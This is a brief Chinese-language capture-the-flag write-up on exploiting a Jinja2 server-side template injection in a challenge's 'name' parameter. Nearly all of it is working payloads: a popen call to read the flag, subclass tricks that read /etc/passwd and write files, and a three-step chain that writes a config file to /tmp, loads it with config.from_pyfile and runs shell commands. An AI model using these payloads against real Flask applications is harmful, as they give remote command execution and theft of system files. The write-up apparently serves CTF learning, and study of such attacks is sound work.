> 先fuzz测试拿到可以get一个name参数（这也要考，真是服了）
# 开始测试输入
```
http://1ae78b0533574fb6b763eccb831e0b3175b19e935cd04dd7.changame.ichunqiu.com/?name={{1%2B1}}
```
> 这样输出的是hello 2，推测是jinja2命令执行，继续深度测试
掏出上次的payload，
```
aa{{''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals['linecache'].__dict__['os'].__dict__['popen']('cat flag*').read()}}
```
en， 果然不能用,大概到func_globals['linecache']就会报错，好像是没有globals，刚刚学了这个就没有这个，换一个新的payload
```
#读文件：
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
#写文件：
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/1').write("") }}
```

看wp
```
name=%7B%7B ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/owned.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') %7D%7D
name=%7B%7B config.from_pyfile('/tmp/owned.cfg') %7D%7D 
name=%7B%7B%20config[%27RUNCMD%27](%27/usr/bin/id%27,shell=True)%20%7D%7D
```
大概就是写了一个配置？然后导入，就能命令执行了